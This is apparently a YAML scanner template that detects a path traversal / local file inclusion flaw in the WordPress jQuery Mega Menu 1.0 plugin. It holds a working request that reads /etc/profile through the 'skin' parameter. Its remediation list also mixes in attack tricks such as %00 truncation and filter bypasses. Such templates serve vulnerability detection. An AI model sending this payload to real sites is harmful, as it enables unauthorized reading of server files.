id: Wordpress-jQuery_Mega_Menu_Plugins-LFI
info:
  name: WordPress Plugin jQuery Mega Menu_1.0_local file contains
  author:
  - l0ne1y
  description: |-
    WordPress Plugin jQuery Mega Menu 1.0 local file inclusion vulnerability
    WordPress and WordPress plugin are both products of the WordPress Foundation. WordPress is a blogging platform developed using PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. WordPress plugin is an application plugin.

    WordPress Plugin jQuery Mega Menu_1.0 has a path traversal vulnerability, which allows remote attackers to conduct file inclusion attacks through the skin parameter.
  severity: critical
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.org/plugins/

    Temporary fix:
    1. Use open_basedir configuration in PHP to restrict access to specified areas and truncate the path length.
    2. Filter. (dot)/(backslash)\\(backslash), encoding bypass
    3. Disable server remote file inclusion
    4. For the situation where the included file suffix is ​​restricted, the PHP version is less than 5.3, php.ini magic_quotes_gpc = off, and the addslashes function is not used for controllable parameters. If these three conditions are met, %00 truncation can be used.
    5. Question mark, pound sign, and space bypass (remote)
requests:
- matchers:
  - type: dsl
    dsl:
    - status_code==200 && contains(body,"/etc/profile")
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/jquery-mega-menu/skin.php?skin=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fprofile'
  method: GET
